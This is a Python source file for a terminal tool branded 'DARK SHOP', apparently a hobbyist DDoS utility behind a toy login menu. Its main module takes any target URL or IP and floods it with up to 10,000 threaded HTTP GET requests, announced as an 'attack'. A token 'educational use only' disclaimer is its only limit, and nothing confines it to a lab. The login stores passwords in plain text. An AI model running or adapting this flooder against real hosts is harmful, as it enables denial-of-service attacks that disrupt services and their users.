import os
import sys
import time
import threading
import socket
from urllib.parse import urlparse

users_db = {}

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    print("\033[1;36m" + "=" * 50)
    print("        DARK SHOP - STRESS TESTING SUITE")
    print("=" * 50 + "\033[0m")

def send_optimized_packet(host, port, path, packet_id, lock, stats):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect((host, port))
        
        request = f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n"
        s.sendall(request.encode('utf-8'))
        s.close()
        
        with lock:
            stats['success'] += 1
            print(f"\033[1;32m[>>] Packet [{packet_id}] Delivered Successfully\033[0m")
    except Exception:
        with lock:
            stats['failed'] += 1
            print(f"\033[1;31m[!] Packet [{packet_id}] Dropped/Blocked\033[0m")

def ddos_stress_module():
    clear_screen()
    show_banner()
    
    print("\033[1;31m")
    print(" [!] WARNING: Educational & Lab Use Only!")
    print(" [!] Public network attacks are illegal. Developer takes zero liability.")
    print("\033[0m")
    
    confirm = input("\033[1;33m[?] Proceed? (y/n): \033[0m").strip().lower()
    if confirm != 'y':
        print("\033[1;31m[-] Aborted.\033[0m")
        time.sleep(1)
        return

    print("\n" + "-" * 50)
    user_identity = input("\033[1;32m[*] Audit Gmail/ID: \033[0m").strip()
    target_url = input("\033[1;32m[*] Target URL/IP (e.g., http://127.0.0.1:8080): \033[0m").strip()
    
    try:
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
            
        parsed_url = urlparse(target_url)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else 80
        path = parsed_url.path if parsed_url.path else "/"
        
        if not host:
            raise ValueError("Invalid Host")
    except Exception:
        print("\033[1;31m[-] Error: Invalid URL format! (Ex: http://127.0.0.1:8080)\033[0m")
        time.sleep(2)
        return

    try:
        request_limit = int(input("\033[1;32m[*] Limit (1-10000): \033[0m").strip())
        if request_limit < 1 or request_limit > 10000:
            print("\033[1;31m[-] Error: Out of range (1-10000)!\033[0m")
            time.sleep(1.5)
            return
    except ValueError:
        print("\033[1;31m[-] Error: Invalid number!\033[0m")
        time.sleep(1.5)
        return

    print("\n" + "=" * 50)
    print(f"\033[1;33m[+] Target: {target_url} | Total Packets: {request_limit}\033[0m")
    print("\033[1;31m[*] Optimized batch attack started. Ctrl+C to stop.\033[0m")
    print("=" * 50 + "\n")
    
    lock = threading.Lock()
    stats = {'success': 0, 'failed': 0}
    
    try:
        batch_size = 50  # একসাথে ৫০টি করে রিকোয়েস্ট পাঠিয়ে ছোট বিরতি দেওয়া হবে
        for i in range(1, request_limit + 1, batch_size):
            threads = []
            end_limit = min(i + batch_size, request_limit + 1)
            
            for j in range(i, end_limit):
                t = threading.Thread(target=send_optimized_packet, args=(host, port, path, j, lock, stats))
                threads.append(t)
                t.start()
                
            for t in threads:
                t.join()
                
            # সার্ভারকে ওভারলোড থেকে বাঁচাতে প্রতি ব্যাচের পরে সামান্য পজ
            time.sleep(0.05)
            
        print("\n\033[1;32m[+] Test Completed!")
        print(f"[+] Total Success: {stats['success']} | Total Dropped/Failed: {stats['failed']}\033[0m")
        
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Interrupted by user.\033[0m")
    
    input("\n\033[1;36mPress Enter to continue...\033[0m")

def auth_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n\033[1;37m[ AUTHENTICATION REQUIRED ]\033[0m")
        print("\033[1;32m1. Login\033[0m")
        print("\033[1;33m2. Register\033[0m")
        print("\033[1;31m0. Exit\033[0m")
        print("-" * 50)
        
        choice = input("\033[1;33m[?] Select: \033[0m").strip()
        
        if choice == '1':
            clear_screen()
            show_banner()
            print("\n[ LOGIN ]")
            username = input("Username: ").strip()
            password = input("Password: ").strip()
            
            if username in users_db and users_db[username] == password:
                print("\n\033[1;32m[+] Login Successful!\033[0m")
                time.sleep(1)
                main_menu()
            else:
                print("\n\033[1;31m[-] Invalid Credentials!\033[0m")
                time.sleep(1.5)
                
        elif choice == '2':
            clear_screen()
            show_banner()
            print("\n[ REGISTER ]")
            username = input("Choose Username: ").strip()
            password = input("Choose Password: ").strip()
            
            if username in users_db:
                print("\n\033[1;31m[-] User already exists!\033[0m")
            elif not username or not password:
                print("\n\033[1;31m[-] Fields cannot be empty!\033[0m")
            else:
                users_db[username] = password
                print("\n\033[1;32m[+] Registration Successful! Please Login.\033[0m")
            time.sleep(1.5)
            
        elif choice == '0':
            print("\n\033[1;31m[!] Exiting...\033[0m")
            sys.exit(0)
        else:
            print("\n\033[1;31m[-] Invalid option!\033[0m")
            time.sleep(1)

def main_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n\033[1;37m[ MAIN MENU ]\033[0m")
        print("\033[1;32m1. DDoS Stress Test\033[0m")
        print("\033[1;31m2. Logout\033[0m")
        print("-" * 50)
        
        choice = input("\033[1;33m[?] Select: \033[0m").strip()
        
        if choice == '1':
            ddos_stress_module()
        elif choice == '2':
            print("\n\033[1;33m[*] Logging out...\033[0m")
            time.sleep(1)
            break
        else:
            print("\n\033[1;31m[-] Invalid option!\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    auth_menu()
